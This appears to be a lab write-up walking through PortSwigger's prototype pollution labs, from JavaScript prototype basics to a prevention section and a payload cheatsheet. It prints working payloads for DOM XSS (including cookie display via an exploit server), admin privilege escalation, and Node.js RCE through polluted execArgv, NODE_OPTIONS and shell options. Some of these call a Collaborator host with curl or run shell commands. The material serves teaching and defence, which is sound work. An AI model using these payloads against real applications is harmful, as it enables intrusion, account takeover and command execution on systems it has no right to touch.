---
title: "Prototype Pollution Attacks"
description: "From objects, prototypes, and the prototype chain to DOM XSS, privilege escalation, and RCE through PortSwigger's Prototype Pollution labs."
date: 2026-10-29 10:00:00 +0700
lang: en
categories: [Web Security, PortSwigger Labs]
tags: [prototype-pollution, javascript, web-exploitation, portswigger, writeup]
toc: true
media_subpath: /assets/img/posts/2026-10-29-prototype-pollution
pin: false
---

## I. What is Prototype Pollution?

If HTTP Request Smuggling is about **smuggling requests**, Prototype Pollution is about **polluting prototypes** 🤔. That sounds abstract, but the idea is interesting: instead of changing each object directly, the attacker changes an object from which many other objects inherit properties.

Suppose an application checks permissions using `user.isAdmin`. I cannot modify the user directly, but if `user` has no own `isAdmin` property, JavaScript looks for it on the prototype. Controlling that inherited value may change the permission check.

That is the problem behind **Prototype Pollution**: user-controlled input passes through unsafe object-handling code, allowing properties to be added to or modified on a prototype. Other code unintentionally reads those values, potentially leading to DOM XSS, privilege escalation, or even RCE.

This post starts with objects and prototypes, then examines five client-side and four server-side PortSwigger labs. The exploit payloads below are presented in the context of those labs.

---

## II. A little JavaScript before we begin

### 1. Objects and prototypes

JavaScript uses **prototype-based inheritance**. Objects contain `key: value` pairs, and a value can itself be a function:

```javascript
const user = {
  name: "Nam",
  sayHello() {
    return `Hello ${this.name}`;
  }
};

console.log(user.name);       // Nam
console.log(user.sayHello()); // Hello Nam
```

Besides its own properties, an ordinary object is linked to another object called its **prototype**. If a property is absent on the current object, JavaScript continues looking on its prototype.

![Overview of inheritance relationships between JavaScript data types](object-prototype.png)
_The diagram from my notes summarizes prototype relationships. For the exact direction of property lookup, see the array prototype chain below._

For example, the object above does not declare `toString()`, but we can still call it:

```javascript
console.log(user.toString()); // [object Object]
console.log(Object.getPrototypeOf(user) === Object.prototype); // true
```

Here, `toString()` is found on `Object.prototype`.

Strings, numbers, and booleans are **primitives**, rather than objects. JavaScript can temporarily wrap them to access methods such as `"hello".toUpperCase()`. Arrays and functions are objects. JavaScript's `class` syntax also operates through prototypes.

### 2. The prototype chain

Property lookup follows this order:

1. Look on the current object itself.
2. If the property is absent, look on its prototype.
3. Continue until the property is found or the chain reaches `null`.
4. Return `undefined` if the property is absent throughout the chain.

For an array:

```text
const items = [];

items
  │ [[Prototype]]
  ▼
Array.prototype
  │ [[Prototype]]
  ▼
Object.prototype
  │ [[Prototype]]
  ▼
null
```

This is the **prototype chain**. `Object.prototype` sits near the end of many ordinary objects' chains, so modifying it may affect many parts of the same JavaScript environment.

```javascript
const user = { name: "Nam" };
Object.prototype.labMarker = "polluted";

console.log(user.labMarker); // polluted
console.log(({}).labMarker); // polluted
console.log(Object.hasOwn(user, "labMarker")); // false

delete Object.prototype.labMarker;
```

No own property was added to `user`. Reading `user.labMarker` finds the inherited value. Even objects created before the pollution can be affected if their lookup chain passes through that prototype.

However, **own properties take precedence**:

```javascript
Object.prototype.isAdmin = true;

const userA = { name: "A" };
const userB = { name: "B", isAdmin: false };

console.log(userA.isAdmin); // true: lấy từ prototype
console.log(userB.isAdmin); // false: lấy từ chính userB

delete Object.prototype.isAdmin;
```

Polluting `isAdmin` therefore does not automatically turn every user into an administrator. You must examine how the application stores and reads it.

### 3. `__proto__`, `.prototype`, and `constructor`

These names recur in payloads but have different roles:

| Component | Meaning |
| --- | --- |
| `[[Prototype]]` | The internal link from an object to its prototype. |
| `obj.__proto__` | An accessor inherited from `Object.prototype`, commonly used to read or change an ordinary object's prototype. |
| `Constructor.prototype` | The object normally used as the prototype of instances created by that constructor. |
| `obj.constructor` | A usually inherited reference to a constructor; it can be overridden or absent. |

For a typical object literal:

```javascript
const obj = {};

console.log(obj.__proto__ === Object.prototype);             // true
console.log(obj.constructor === Object);                    // true
console.log(obj.constructor.prototype === Object.prototype); // true
```

In this case, an attacker has two routes to `Object.prototype`:

```text
obj → __proto__ → Object.prototype
obj → constructor → prototype → Object.prototype
```

This is why blocking only `__proto__` may be insufficient. However, `constructor.prototype` is not equivalent to `__proto__` for every object. `Object.create(null)`, custom constructors, and overridden constructor properties behave differently.

---

## III. Where does the vulnerability originate?

### 1. Dynamic property writes and unsafe path handling

Suppose an application converts this query string into an object:

```text
?user[name]=Nam

→ { user: { name: "Nam" } }
```

A parser supporting nested objects splits the path into `user` and `name`, then traverses those components before assigning a value. Without key validation, an attacker can substitute:

```text
?__proto__[isAdmin]=true
```

In a vulnerable parser, the final operation may be equivalent to:

```javascript
const target = {};
target["__proto__"]["isAdmin"] = "true";

console.log(({}).isAdmin); // "true"
delete Object.prototype.isAdmin;
```

`target["__proto__"]` returns the target's prototype, here `Object.prototype`. The next assignment writes to that shared prototype.

Notice that `"true"` in the query string is a **string**, whereas `true` in JSON is a **boolean**. Type checks can affect exploitation.

A URL cannot modify a prototype on its own. Code must read it and handle the path unsafely. Ordinary `URLSearchParams` reads parameter names and values without automatically interpreting brackets as nested objects.

### 2. JSON payloads and deep merging

Another source is JSON sent to a data-update API:

```json
{
  "__proto__": {
    "labMarker": "polluted"
  }
}
```

`JSON.parse()` merely creates an **own property** named `__proto__`; it does not automatically modify `Object.prototype`:

```javascript
const input = JSON.parse('{"__proto__":{"labMarker":"polluted"}}');

console.log(Object.hasOwn(input, "__proto__")); // true
console.log(({}).labMarker);                   // undefined
```

The problem appears when that data reaches an unsafe merge function. This simplified example demonstrates the mechanism and is not suitable for application use:

```javascript
function unsafeMerge(target, source) {
  for (const key of Object.keys(source)) {
    const value = source[key];

    if (value !== null && typeof value === "object") {
      if (!target[key]) target[key] = {};
      unsafeMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}

const input = JSON.parse('{"__proto__":{"labMarker":"polluted"}}');
unsafeMerge({}, input);

console.log(({}).labMarker); // polluted
delete Object.prototype.labMarker;
```

Step by step:

1. `key` becomes `__proto__`, and `value` is an object.
2. `target[key]` returns the truthy `Object.prototype`, so no new object is created.
3. The function calls `unsafeMerge(Object.prototype, { labMarker: "polluted" })`.
4. The recursive assignment `target.labMarker = "polluted"` writes to `Object.prototype`.

I deliberately used `Object.keys()` to show that **changing the loop alone is insufficient**. The code still reads an inherited property from `target` and traverses into the prototype.

Also, `const obj = { __proto__: {...} }` uses special object-literal syntax to set a prototype. It differs from an object created by `JSON.parse()`. Use `JSON.parse()` when building a PoC that should reproduce JSON received by a server.

### 3. Changing one object's prototype versus polluting a shared prototype

Not every `__proto__` operation has the same effect:

```javascript
const input = JSON.parse('{"__proto__":{"labMarker":"local"}}');
const target = Object.assign({}, input);

console.log(target.labMarker); // local
console.log(({}).labMarker);   // undefined
```

Here, `Object.assign()` invokes the target's `__proto__` setter, changing **the target's** prototype without adding `labMarker` to `Object.prototype`. This can still be dangerous for a sensitive configuration object, but its scope differs from the deep merge above.

Object spread, `{ ...input }`, does not invoke that setter in the same way. Passing the result into a vulnerable deep merge later can still introduce risk. See [MDN's Prototype Pollution documentation](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).

### 4. Sources, gadgets, and sinks

Polluting an unused property is not a complete exploit. We need code that actually consumes it:

```text
Source                    Pollution             Gadget             Sink
URL / JSON / message  →   ghi vào prototype  →   đọc thuộc tính  →   hành vi nguy hiểm
```

| Component | Role | Lab examples |
| --- | --- | --- |
| Source | The route from attacker-controlled data to a prototype write. | Query parsers, fragment parsers, JSON deep merges. |
| Gadget | Code that reads the polluted property and puts it into a useful execution path. | `config.transport_url`, `manager.sequence`, a descriptor missing `value`. |
| Sink | Where the final impact occurs. | `script.src`, `eval()`, string-based `setTimeout()`, child process execution. |

For example:

```javascript
const config = {};
const script = document.createElement("script");

if (config.transport_url) {
  script.src = config.transport_url;
  document.body.appendChild(script);
}
```

If the attacker pollutes `Object.prototype.transport_url`, `config` reads that inherited value. An object-handling flaw now controls the script source loaded by the page.

---

## IV. Client-side Prototype Pollution

Client-side sources commonly include query strings, fragments after `#`, and JSON processed by JavaScript. DevTools lets us inspect code, set breakpoints, and examine prototypes directly.

A useful manual workflow:

1. Try a marker such as `?__proto__[labMarker]=ntran`.
2. Inspect `Object.prototype.labMarker` and `({}).labMarker` in the Console.
3. If necessary, try dot notation or a `constructor.prototype` path supported by the parser.
4. Find configuration reads without own properties and trace them to a sink.
5. Combine the source and gadget, then verify the complete URL in a fresh page.

Assigning `Object.prototype.foo = "bar"` manually in the Console only tests a gadget. To prove the source is vulnerable, page input must create the property.

### 1. Lab: Client-side prototype pollution via browser APIs

**Lab link:** [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)

Find a source and gadget that call `alert()`. The interesting detail is that the developer recognized a gadget and attempted to lock it down.

In `searchLoggerConfigurable.js`, the configuration resembles:

```javascript
let config = {
  params: deparam(new URL(location).searchParams.toString()),
  transport_url: false
};

Object.defineProperty(config, "transport_url", {
  configurable: false,
  writable: false
});
```

`transport_url` is an own property set to `false`, so polluting the same name on `Object.prototype` cannot override it. The developer also sets `writable: false` and `configurable: false`.

However, the third argument to `Object.defineProperty()` is itself an ordinary object: a **property descriptor**.

#### What's in a property descriptor?

| Property | Meaning |
| --- | --- |
| `value` | The value of a data property. |
| `writable` | Whether assignment can change the value. |
| `get`, `set` | Accessor functions; cannot be combined with `value` or `writable` in one descriptor. |
| `enumerable` | Whether the property appears in enumeration such as `Object.keys()` or `for...in`. |
| `configurable` | Whether deletion and permitted descriptor changes are allowed. |

When defining a new property, omitted flags default to `false` and `value` defaults to `undefined`. For an existing property, truly absent descriptor fields generally preserve existing attributes. But **inherited descriptor fields can still be read**. See [MDN's `Object.defineProperty()` documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty).

Polluting `value` therefore lets the descriptor inherit it and update `config.transport_url` during the very call intended to lock the property.

#### Payload

First test the source:

```text
/?__proto__[labMarker]=ntran
```

In the Console:

```javascript
Object.prototype.labMarker // "ntran"
```

Then target the `value` gadget:

```text
/?__proto__[value]=data:,alert(1);
```

The exploit chain:

```text
deparam() xử lý query string
  → Object.prototype.value = "data:,alert(1);"
  → descriptor kế thừa value
  → defineProperty() đặt config.transport_url thành payload
  → script.src nhận URL do attacker kiểm soát
  → alert(1)
```

`data:,alert(1);` embeds JavaScript directly in a URL. This works under the lab's conditions; real sites may have CSP and script-loading restrictions.

#### Fixing it

Setting an explicit trusted `value: false` blocks inheritance of `value`. A descriptor without a prototype is a stronger option:

```javascript
const descriptor = Object.create(null);
descriptor.value = false;
descriptor.writable = false;
descriptor.configurable = false;

Object.defineProperty(config, "transport_url", descriptor);
```

This protects that configuration operation. The `deparam()` source still needs a separate fix.

### 2. Lab: DOM XSS via client-side prototype pollution

**Lab link:** [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)

This lab demonstrates the `transport_url` gadget more directly. In `searchLogger.js`, URL parameters are passed to `deparam()`:

```javascript
let config = {
  params: deparam(new URL(location).searchParams.toString())
};
```

The parser supports bracket-delimited nested keys. Its important logic can be simplified to:

```javascript
// Minh họa cách parser đi qua từng thành phần của đường dẫn.
cur = cur[key] = i < keys_last
  ? cur[key] || (keys[i + 1] && isNaN(keys[i + 1]) ? {} : [])
  : val;
```

`__proto__[labMarker]=ntran` becomes `['__proto__', 'labMarker']`:

1. Initially, `cur` is the result object. `cur['__proto__']` returns `Object.prototype`, so traversal continues there.
2. The next assignment, `cur['labMarker'] = 'ntran'`, writes to `Object.prototype`.

After confirming the marker in the Console, find the code creating a `<script>` from `config.transport_url`. Unlike the previous lab, `config` has no own `transport_url`, so target it directly:

```text
/?__proto__[transport_url]=data:,alert(1);
```

To observe the chain incrementally, try `foo` first:

```text
/?__proto__[transport_url]=foo
```

The Elements tab shows a script with `src="foo"`. The source reaches the sink; replace the value with the XSS PoC.

The first two labs look similar but use different gadgets: the browser API lab uses **the descriptor's `value`**, while this one uses **the config's `transport_url`** directly.

### 3. Lab: DOM XSS via an alternative prototype pollution vector

**Lab link:** [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)

This parser behaves differently. Bracket notation fails, but dot notation works:

```text
/?__proto__.labMarker=ntran
```

The recursive `createElement()` function handles dots using:

```javascript
if (key.indexOf(".") !== -1) {
  var list = key.split(".");
  var new_key = key.split(/\.(.+)?/)[1];

  if (!params[list[0]]) params[list[0]] = {};

  if (new_key !== "") {
    createElement(params[list[0]], new_key, value);
  }
}
```

When `list[0]` is `__proto__`, `params[list[0]]` returns a truthy object. The code skips creating a fresh object and passes the prototype to the next recursive call.

Now find the sink in `searchLoggerAlternative.js`:

```javascript
window.macros = {};
window.manager = {
  params: $.parseParams(new URL(location)),
  macro(property) {
    if (window.macros.hasOwnProperty(property)) {
      return macros[property];
    }
  }
};

let a = manager.sequence || 1;
manager.sequence = a + 1;

eval('if(manager && manager.sequence){ manager.macro(' + manager.sequence + ') }');
```

`manager` has no own `sequence` on the first read. An inherited string can therefore enter code passed to `eval()`.

However, this initial payload does not work:

```text
/?__proto__.sequence=alert(1)
```

Why? `a + 1` performs **string concatenation** because `a` is a string:

```javascript
"alert(1)" + 1 // "alert(1)1"
```

The sink receives:

```javascript
if(manager && manager.sequence){ manager.macro(alert(1)1) }
```

The syntax is invalid, so `eval()` fails. A breakpoint at the sink reveals the extra `1` at the end of `manager.sequence`.

A compact fix is to append a minus sign:

```text
/?__proto__.sequence=alert(1)-
```

The generated code becomes:

```javascript
if(manager && manager.sequence){ manager.macro(alert(1)-1) }
```

JavaScript calls `alert(1)` while evaluating the argument to `manager.macro()`. The subtraction's final value does not matter for the lab.

Another approach in my notes closes the call and block, then comments out the remainder:

```text
/?__proto__.sequence=1)};alert(1);//
```

After the extra `1` is appended, `eval()` receives:

```javascript
if(manager && manager.sequence){ manager.macro(1)};alert(1);//1) }
```

Always inspect **the final string at the sink**: a payload may be transformed before execution.

### 4. Lab: Client-side prototype pollution via flawed sanitization

**Lab link:** [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)

The goal is still `alert()`, but this time the client filters keys:

```javascript
function sanitizeKey(key) {
  let badProperties = ["constructor", "__proto__", "prototype"];

  for (let badProperty of badProperties) {
    key = key.replaceAll(badProperty, "");
  }

  return key;
}
```

The problem is that it **removes forbidden substrings and keeps using the result**, even though the result may recreate a forbidden name.

For example:

```javascript
"__pro__proto__to__".replaceAll("__proto__", "")
// "__proto__"
```

`replaceAll()` removes matches from its input; it does not repeatedly sanitize the newly formed result. The surviving `__pro` and `to__` combine into `__proto__`.

Test the source:

```text
/?__pro__proto__to__[labMarker]=ntran
```

If the Console confirms `Object.prototype.labMarker === "ntran"`, use the familiar `transport_url` gadget:

```text
/?__pro__proto__to__[transport_url]=data:,alert(1);
```

Other variants from my notes:

```text
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

These still depend on the parser's supported syntax. Dot and bracket payloads are not interchangeable in every application.

A better fix is to **reject invalid paths** and validate each parsed component instead of deleting substrings and continuing with the modified value.

### 5. Lab: Client-side prototype pollution in third-party libraries

**Lab link:** [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

Minified third-party code can make manual gadget discovery slow. Here I use **DOM Invader** in Burp's built-in browser:

1. Enable DOM Invader and its Prototype Pollution checks.
2. Visit the lab homepage, open DevTools → DOM Invader, and reload.
3. Observe the detected source in `location.hash`, after `#`.
4. Choose **Scan for gadgets** to open a scanning tab.
5. When scanning finishes, open DevTools → DOM Invader in that tab.
6. Inspect `hitCallback` reaching `setTimeout()` and use **Exploit** to test the PoC.

`setTimeout()` accepts a function or a string. This gadget supplies a string that is interpreted as JavaScript.

Disable DOM Invader and confirm the payload works independently. Set the lab exploit server's body to:

```html
<script>
  location = "https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29";
</script>
```

Replace `YOUR-LAB-ID`, test in your own browser, then deliver through the exploit server's victim feature.

`%28` and `%29` are URL-encoded parentheses. The initial HTTP request does not send the fragment to the server, but page JavaScript reads it and passes it into the vulnerable parser.

Displaying `document.cookie` is sufficient for this lab. Success in your own browser alone is insufficient; verify that the redirect chain executes in the victim's browser too.

---

## V. Server-side Prototype Pollution

### 1. Differences from client-side testing

The principle is still to write to a prototype and find a gadget, but we often lack server source and a Console. We infer pollution from responses and behavioral changes.

Pollution may persist for the lifetime of the Node.js process. Reloading the browser does not reset it. Multiple workers can also route requests to different processes, making observations inconsistent.

### 2. Property reflection and for...in

`for...in` enumerates inherited enumerable properties too:

```javascript
Object.prototype.labMarker = "ntran";
const user = { name: "Nam" };

for (const key in user) {
  console.log(key); // name, labMarker
}

console.log(Object.keys(user)); // ["name"]
console.log(JSON.stringify(user)); // {"name":"Nam"}

delete Object.prototype.labMarker;
```

If the server copies properties into a response using `for...in`, inherited markers may appear in the returned JSON. **Ordinary `JSON.stringify()` does not serialize inherited properties on its own.** Application behavior must first copy them into the output.

To iterate only own properties, use `for...of` with `Object.keys(obj)` or `Object.entries(obj)`. Simply replacing a loop with `for...of` is insufficient because ordinary objects are not iterable.

### 3. Lab: Privilege escalation via server-side prototype pollution

**Lab link:** [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)

![Find a source, become an administrator, and delete carlos](lab-privilege-escalation.png)

Log in with `wiener:peter`, update the address, and find the request in Burp HTTP history:

```http
POST /my-account/change-address HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json
```

The body looks like:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "YOUR-SESSION-ID"
}
```

Send it to Repeater. Keep the existing fields and session, and add this property to the JSON body:

```json
"__proto__": {
  "labMarker": "ntran"
}
```

JSON fragments in these labs are **properties to add to the existing body object**. Place commas appropriately.

A marker appearing without its surrounding `__proto__` object is consistent with prototype data being copied into the response. That is stronger evidence than a simple echo of the entire payload, but black-box testing should still compare behavior to establish the scope of pollution.

The response also contains `isAdmin: false`. Replace the marker with:

```json
"__proto__": {
  "isAdmin": true
}
```

Send it, reload the account page, open the admin panel, and delete `carlos`.

#### Why can isAdmin change when the original response said false?

JSON output does not reveal whether `isAdmin` was an own property or an inherited value copied into the response. This lab's behavior is consistent with the relevant permission check reading an inherited value.

If the checked object truly had its own `isAdmin: false`, modifying `Object.prototype.isAdmin` would not override it, as shown in section II.

Sending `"isAdmin": true` directly may fail because of input field filtering or the update flow. Without backend source, we cannot identify the precise middleware responsible. What matters is demonstrating that the nested prototype payload changes permissions.

### 4. Lab: Detecting server-side prototype pollution without polluted property reflection

**Lab link:** [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)

The address-update feature still exists, but markers do not appear in responses. That does not prove safety: the prototype may be polluted while response code copies only own properties.

![The update request contains __proto__ with a nam:tran marker, but the response does not reflect it](lab-detection-without-reflection.png)
_The screenshot uses `"__proto__": {"nam": "tran"}`. The response returns user information without `nam`, so we need a behavioral signal._

The goal is to confirm pollution through behavior, without privilege escalation or RCE. My notes use **status code override**.

#### Step 1: Record the baseline error

Make the update JSON invalid, for example by removing a comma. The server returns HTTP `500 Internal Server Error`, while the error object in the body resembles:

```json
{
  "error": {
    "statusCode": 400,
    "status": 400,
    "type": "entity.parse.failed"
  }
}
```

Distinguish **the HTTP status line** from **`status` inside the JSON body**. They may differ; here we track the error object's property.

#### Step 2: Send valid JSON containing the payload

Repair the JSON and add:

```json
"__proto__": {
  "status": 510
}
```

The payload must reach the merge function. Invalid JSON may be rejected during parsing before the vulnerable code runs.

#### Step 3: Trigger the same error again

Repeat the malformed request from step 1. A change from `400` to `510` in the error object indicates that an inherited value was consumed.

The relevant `http-errors` logic discussed by PortSwigger resembles:

```javascript
status = err.status || err.statusCode || status;
```

Initially, the parser supplies `400` for invalid JSON. If `err` lacks the inspected properties, the code uses that fallback. After pollution, `err.status` can resolve to inherited `510` and take precedence.

Choose a distinctive value within `400–599`. Out-of-range values may be normalized to `500`, obscuring the signal.

#### Two other techniques from my notes

| Technique | Property added to __proto__ | Signal |
| --- | --- | --- |
| JSON spaces override | `"json spaces": 10` | JSON response indentation changes. Inspect **Raw**, since Pretty may reformat it. |
| Charset override | `"content-type": "application/json; charset=utf-7"` | On affected runtime/middleware combinations, a later UTF-7 request is decoded differently. |

For the charset test, submit an address containing `+AGYAbwBv-` before and after pollution. If it originally remains unchanged but later becomes `foo`, investigate further.

In the older mechanism described in my notes, header-handling code reads inherited `content-type` and may ignore the real header. Downstream middleware then uses the attacker-supplied charset. Charset and JSON-spaces overrides depend on implementation versions; they do not work in every Node.js/Express application. See [PortSwigger's server-side detection techniques](https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection).

### 5. Lab: Bypassing flawed input filters for server-side prototype pollution

**Lab link:** [Bypassing flawed input filters for server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)

The goal is again to become an administrator and delete `carlos`, but the previous `__proto__` payload fails.

Changing the key to `__proto__x` makes the server accept it. This suggests a filter targeting `__proto__`, without proving that every prototype access path is blocked.

![The server reflects __proto__x unchanged while isAdmin remains false](lab-bypassing-input-filters.png)
_Accepting `__proto__x` as ordinary data is not pollution. Next, test `constructor.prototype`._

For an ordinary object, `obj.constructor` can return `Object`, whose `.prototype` is `Object.prototype`.

First test a behavioral change:

```json
"constructor": {
  "prototype": {
    "json spaces": 10
  }
}
```

If Raw response indentation changes, switch to the privilege-escalation gadget:

```json
"constructor": {
  "prototype": {
    "isAdmin": true
  }
}
```

Reload, open the admin panel, and delete `carlos`.

The path to visualize is:

```text
object đích
  → constructor (Object)
  → prototype (Object.prototype)
  → isAdmin = true
```

This bypass requires traversal through the constructor. A merge function that rejects functions, creates new own properties, or follows other rules may block it. Verify behavior instead of assuming that `constructor` always bypasses a `__proto__` filter.

### 6. Lab: Remote code execution via server-side prototype pollution

**Lab link:** [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

Here `wiener:peter` already has administrator access. The goal is to delete `/home/carlos/morale.txt` through RCE.

The source remains the JSON address-update request. Confirm it with `json spaces`, then find a feature that creates a child process. The admin panel's maintenance jobs provide the required trigger.

#### The execArgv gadget

`child_process.fork()` creates a child Node.js process. Its `execArgv` option supplies Node's startup arguments. In the lab's vulnerable setup, this option can be inherited from the prototype.

Controlling `execArgv` lets the attacker supply `--eval` to execute JavaScript:

```json
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
  ]
}
```

Replace the hostname with your lab session's Collaborator domain, send the payload, and run maintenance jobs. A callback tied to that trigger helps confirm execution. Missing callbacks may also result from absent `curl`, blocked outbound traffic, or an unused gadget.

The payload that completes the lab:

```json
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
  ]
}
```

Sending the update request alone is insufficient. **Run the admin panel's job** so the application creates the child process and consumes the polluted option.

```text
JSON change-address
  → hàm merge làm ô nhiễm prototype
  → execArgv tồn tại trên Object.prototype
  → admin chạy maintenance job
  → luồng tạo tiến trình con đọc execArgv
  → Node xử lý --eval
  → execSync() chạy lệnh của lab
```

Here the JavaScript passed through `--eval` explicitly calls `execSync()`. Do not confuse this with an application that already calls `execSync()` and inherits polluted `shell` or `input` options, as below.

### 7. Other RCE gadgets from my notes

These payloads illustrate other gadget paths. Exploitability depends on Node.js and dependency versions, explicitly supplied options, and the process creation path. Not every `child_process` call reads inherited options in the same way.

#### shell and NODE_OPTIONS

```json
"__proto__": {
  "shell": "node",
  "NODE_OPTIONS": "--inspect=YOUR-COLLABORATOR-ID.oastify.com"
}
```

In an affected flow, `shell` selects Node as the shell, while `NODE_OPTIONS` may enter the child process environment. `--inspect` makes Node handle an inspector hostname and can produce a DNS interaction.

**A DNS callback does not prove arbitrary command execution** or an externally reachable debugger. It can help identify which application feature touches process configuration.

#### execSync() with shell and input

If the application already calls `execSync()`, another approach is to change its shell and standard input:

```json
"__proto__": {
  "shell": "vim",
  "input": ":! whoami\n"
}
```

The idea is to use Vim as a program that reads commands from stdin. `:!` runs a system command, and `\n` in the JSON string becomes a newline terminating the command.

`input` alone is not executable code: the selected program must interpret it as commands. This also requires Vim, compatible process invocation, and options that actually consume inherited values. See [Node.js child_process options](https://nodejs.org/api/child_process.html).

---

## VI. Finding gadgets when you don't know what to pollute

One debugging technique is to install a getter and observe whether the application reads a suspected property. In client-side debugging, pause **before the code you want to inspect**, then run:

```javascript
Object.defineProperty(Object.prototype, "suspectedOption", {
  configurable: true,
  get() {
    console.trace("suspectedOption was read");
    return "ntran-canary";
  }
});
```

Resume execution. If the Console prints a stack trace, follow it to the property read and its eventual sink.

Remove the getter afterward:

```javascript
delete Object.prototype.suspectedOption;
```

`configurable: true` allows cleanup. A getter reveals a read, rather than proving exploitability, and may alter application write behavior. DOM Invader automates source and gadget discovery, but the final result still needs an independent PoC.

---

## VII. Preventing Prototype Pollution

The labs show two priorities: **prevent writes into prototypes** and **prevent sensitive logic from unintentionally consuming inherited properties**.

### 1. Restrict which data can be updated

An address-update endpoint should accept only necessary address fields instead of merging the entire body into a user object:

```javascript
const allowedFields = [
  "address_line_1", "address_line_2", "city", "postcode", "country"
];

const update = Object.create(null);

for (const key of allowedFields) {
  if (Object.hasOwn(body, key)) {
    if (typeof body[key] !== "string") {
      throw new TypeError("Invalid address field");
    }
    update[key] = body[key];
  }
}
```

This illustrates field selection. Production code must also validate lengths, formats, and required fields. Schema validators should reject unexpected properties, including nested ones. Administrator permissions must come from trusted server-side data.

### 2. Validate every path component

A generic parser or merge function must control traversal through each key. Blocking one outer `__proto__` while allowing nested `constructor.prototype` is insufficient.

For structures that do not require these special names, reject `__proto__`, `constructor`, and `prototype` at every parsed level. Avoid substring deletion like the flawed-sanitization lab. Prefer a maintained library with established protections over a complex homegrown deep merge.

### 3. Read own properties in sensitive logic

```javascript
function canAccessAdmin(user) {
  return Object.hasOwn(user, "isAdmin") && user.isAdmin === true;
}
```

This avoids inheriting `isAdmin`. However, an own property is still untrustworthy if the client was previously allowed to assign it. Protect the source of authorization data too.

Likewise, when iterating:

```javascript
for (const [key, value] of Object.entries(input)) {
  // Chỉ các own enumerable properties của input.
}
```

This prevents copying inherited source properties, but key validation and target access still matter during a merge, as section III demonstrates.

### 4. Use null-prototype objects or Map

```javascript
const config = Object.create(null);
config.transport_url = false;

const dictionary = new Map();
dictionary.set("__proto__", "ordinary data");
console.log(dictionary.get("__proto__")); // ordinary data
```

A null-prototype object does not inherit from `Object.prototype`. `Map` suits key-value storage through `set()` and `get()`. Nested ordinary objects and subsequent unsafe merges still need protection.

### 5. Protect descriptors and remove dangerous sinks

The browser API lab shows that locking a property can still read an unsafe descriptor. Specify trusted values explicitly and consider null-prototype descriptors.

At the sink, `eval()` is unnecessary just to call a method. Validate `manager.sequence` and call the function directly instead of constructing code. Supply functions to `setTimeout()`. Restrict dynamic script URLs to actual application needs. A suitable CSP can reduce impact but does not repair the pollution source.

### 6. Runtime and dependencies

Node.js provides these options:

```shell
node --disable-proto=throw app.js
node --disable-proto=delete app.js
```

These are alternatives: `throw` makes access to the `__proto__` accessor throw, while `delete` removes that accessor. Neither automatically blocks `constructor.prototype`.

`Object.freeze(Object.prototype)` can prevent changes to that prototype, but consider library and polyfill compatibility. Freezing it does not protect every other prototype or nested object. Update the runtime, parsers, and merge libraries as well. See the [OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html).

---

## VIII. Lab cheatsheet

### 1. Client-side

| Goal | URL payload | Condition |
| --- | --- | --- |
| Probe a bracket-based source | `?__proto__[labMarker]=ntran` | The parser supports brackets and writes unsafely. |
| Probe a dot-based source | `?__proto__.labMarker=ntran` | The parser supports dot paths. |
| Test a constructor path | `?constructor.prototype.labMarker=ntran` | Traversal through the constructor is allowed. |
| Script URL gadget | `?__proto__[transport_url]=data:,alert(1);` | Configuration inherits the value and sends it to `script.src`. |
| Descriptor gadget | `?__proto__[value]=data:,alert(1);` | The defineProperty descriptor inherits `value`. |
| eval gadget | `?__proto__.sequence=alert(1)-` | The application appends `1`, as in the alternative-vector lab. |
| Bypass substring removal | `?__pro__proto__to__[transport_url]=data:,alert(1);` | The sanitizer removes matches once and uses the result. |
| Third-party library gadget | `#__proto__[hitCallback]=alert%28document.cookie%29` | A fragment parser feeds a gadget reaching a string-code sink. |

### 2. Server-side

Add these payload objects to a valid JSON request body:

| Goal | Payload | Signal or trigger |
| --- | --- | --- |
| Property reflection | `{"__proto__":{"labMarker":"ntran"}}` | The marker appears through response processing. |
| JSON spaces | `{"__proto__":{"json spaces":10}}` | Raw JSON indentation changes on an affected stack. |
| Status override | `{"__proto__":{"status":510}}` | Trigger the error again and compare its object. |
| Charset override | `{"__proto__":{"content-type":"application/json; charset=utf-7"}}` | Later UTF-7 input decodes differently on an affected stack. |
| Privilege escalation | `{"__proto__":{"isAdmin":true}}` | Authorization code actually consumes the polluted value. |
